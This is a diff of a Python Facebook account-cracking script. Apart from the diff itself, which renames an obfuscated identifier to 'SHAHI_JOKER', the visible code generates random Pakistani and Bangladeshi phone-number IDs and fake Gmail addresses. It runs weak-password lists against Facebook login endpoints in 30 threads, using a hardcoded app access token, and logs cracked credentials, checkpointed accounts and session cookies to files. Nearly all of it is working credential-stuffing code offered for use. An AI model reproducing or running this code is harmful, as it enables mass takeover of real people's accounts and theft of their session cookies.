@@ -325,7 +325,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as 🄹🄾🄺🄴🅁:	
+		with tred(max_workers=30) as SHAHI_JOKER:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -351,17 +351,17 @@ def pak():
 				elif pcs in ['8','08']:
 					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
 				if mthd in ['1','01']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁1,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER1,ids,passlist)
 				if mthd in ['2','02']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁2,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER2,ids,passlist)
 				if mthd in ['3','03']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁3,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER3,ids,passlist)
 				if mthd in ['4','04']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁4,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER4,ids,passlist)
 				if mthd in ['5','05']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁5,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER5,ids,passlist)
 				if mthd in ['6','06']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁6,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
@@ -389,7 +389,7 @@ def BD():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(8))
 			user.append(nmp)
-		with tred(max_workers=30) as 🄹🄾🄺🄴🅁:	
+		with tred(max_workers=30) as SHAHI_JOKER:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -399,7 +399,7 @@ def BD():
 			for psx in user:
 				ids = '+88'+code+psx
 				passlist = [uid[3:11],uid[3:11],uid[3:10],uid[6:14],uid[8:14],'bangla','bangladesh','Bangladesh','i love you','@@@###','@#@#@#','###@@@','free fire','fuck you']
-				🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁3,ids,passlist)
+				SHAHI_JOKER.submit(SHAHI_JOKER3,ids,passlist)
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
@@ -439,7 +439,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as 🄹🄾🄺🄴🅁:
+		with tred(max_workers=30) as SHAHI_JOKER:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -463,17 +463,17 @@ def gmail():
 				else:
 					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
 				if mthd in ['1','01']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁1,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER1,ids,passlist)
 				if mthd in ['2','02']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁2,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER2,ids,passlist)
 				if mthd in ['3','03']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁3,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER3,ids,passlist)
 				if mthd in ['4','04']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁4,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER4,ids,passlist)
 				if mthd in ['5','05']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁5,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER5,ids,passlist)
 				if mthd in ['6','06']:
-					🄹🄾🄺🄴🅁.submit(🄹🄾🄺🄴🅁6,ids,passlist)
+					SHAHI_JOKER.submit(SHAHI_JOKER6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
@@ -486,7 +486,7 @@ def gmail():
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -551,18 +551,18 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/🄹🄾🄺🄴🅁-OK.txt','a').write(ids+'|'+pas+'\n')
+					print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SHAHI_JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -576,7 +576,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -624,26 +624,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/🄹🄾🄺🄴🅁-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/SHAHI_JOKER-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/SHAHI_JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[🄹🄾🄺🄴🅁-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SHAHI_JOKER-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -655,7 +655,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -723,26 +723,26 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/🄹🄾🄺🄴🅁-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/SHAHI_JOKER-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/SHAHI_JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[🄹🄾🄺🄴🅁-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SHAHI_JOKER-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -755,7 +755,7 @@ def api3(ids,names,passlist):
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -824,23 +824,23 @@ def api4(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[🄹🄾🄺🄴🅁-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SHAHI_JOKER-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -852,7 +852,7 @@ def api4(ids,names,passlist):
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -940,26 +940,26 @@ def api5(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/🄹🄾🄺🄴🅁-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/SHAHI_JOKER-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/SHAHI_JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[🄹🄾🄺🄴🅁-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SHAHI_JOKER-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/🄹🄾🄺🄴🅁-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SHAHI_JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -969,7 +969,7 @@ def api5(ids,names,passlist):
                 pass
 def api6(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -986,18 +986,18 @@ def api6(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			🄹🄾🄺🄴🅁=session.cookies.get_dict().keys()
-			if "c_user" in 🄹🄾🄺🄴🅁:
+			SHAHI_JOKER=session.cookies.get_dict().keys()
+			if "c_user" in SHAHI_JOKER:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] %s | %s'%(ids,pas))
-				open('/sdcard/🄹🄾🄺🄴🅁-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [SHAHI_JOKER-OK] %s | %s'%(ids,pas))
+				open('/sdcard/SHAHI_JOKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in 🄹🄾🄺🄴🅁:
+			elif 'checkpoint' in SHAHI_JOKER:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/🄹🄾🄺🄴🅁-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SHAHI_JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1011,7 +1011,7 @@ def api6(ids,names,passlist):
 #d.fb
 def api7(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1028,18 +1028,18 @@ def api7(ids,names,passlist):
 			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			🄹🄾🄺🄴🅁=session.cookies.get_dict().keys()
-			if "c_user" in 🄹🄾🄺🄴🅁:
+			SHAHI_JOKER=session.cookies.get_dict().keys()
+			if "c_user" in SHAHI_JOKER:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] %s | %s'%(ids,pas))
-				open('/sdcard/🄹🄾🄺🄴🅁-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [SHAHI_JOKER-OK] %s | %s'%(ids,pas))
+				open('/sdcard/SHAHI_JOKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in 🄹🄾🄺🄴🅁:
+			elif 'checkpoint' in SHAHI_JOKER:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/🄹🄾🄺🄴🅁-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SHAHI_JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1052,7 +1052,7 @@ def api7(ids,names,passlist):
 #method7
 def api8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1069,18 +1069,18 @@ def api8(ids,names,passlist):
 			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			🄹🄾🄺🄴🅁=session.cookies.get_dict().keys()
-			if "c_user" in 🄹🄾🄺🄴🅁:
+			SHAHI_JOKER=session.cookies.get_dict().keys()
+			if "c_user" in SHAHI_JOKER:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] %s | %s'%(ids,pas))
-				open('/sdcard/🄹🄾🄺🄴🅁-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [SHAHI_JOKER-OK] %s | %s'%(ids,pas))
+				open('/sdcard/SHAHI_JOKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in 🄹🄾🄺🄴🅁:
+			elif 'checkpoint' in SHAHI_JOKER:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/🄹🄾🄺🄴🅁-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SHAHI_JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1091,10 +1091,10 @@ def api8(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 #method1rnd
-def 🄹🄾🄺🄴🅁1(ids,passlist):
+def SHAHI_JOKER1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1178,8 +1178,8 @@ def 🄹🄾🄺🄴🅁1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1189,8 +1189,8 @@ def 🄹🄾🄺🄴🅁1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1198,7 +1198,7 @@ def 🄹🄾🄺🄴🅁1(ids,passlist):
         except Exception as e:
                 pass
 
-def 🄹🄾🄺🄴🅁2(ids,passlist):
+def SHAHI_JOKER2(ids,passlist):
 	global loop
 	global oks
 	try:
@@ -1260,12 +1260,12 @@ def 🄹🄾🄺🄴🅁2(ids,passlist):
 			if 'session_key' in q:
 				udx = str(q['uid'])
 				print('\r\r\033[1;32m [Mr.SPY-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/🄹🄾🄺🄴🅁-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				open('/sdcard/SHAHI_JOKER-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
 				print('\r\r\x1b[38;5;205m [Mr.SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/🄹🄾🄺🄴🅁-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/SHAHI_JOKER-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1277,10 +1277,10 @@ def 🄹🄾🄺🄴🅁2(ids,passlist):
 		print(e)
 #new method
                 
-def 🄹🄾🄺🄴🅁3(ids,passlist):
+def SHAHI_JOKER3(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [🄹🄾🄺🄴🅁-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SHAHI_JOKER-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1353,11 +1353,11 @@ def 🄹🄾🄺🄴🅁3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [🄹🄾🄺🄴🅁-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI_JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/🄹🄾🄺🄴🅁-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        #open('/sdcard/SHAHI_JOKER-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/SHAHI_JOKER-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1367,8 +1367,8 @@ def 🄹🄾🄺🄴🅁3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [🄹🄾🄺🄴🅁-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/🄹🄾🄺🄴🅁-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SHAHI_JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHAHI_JOKER-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
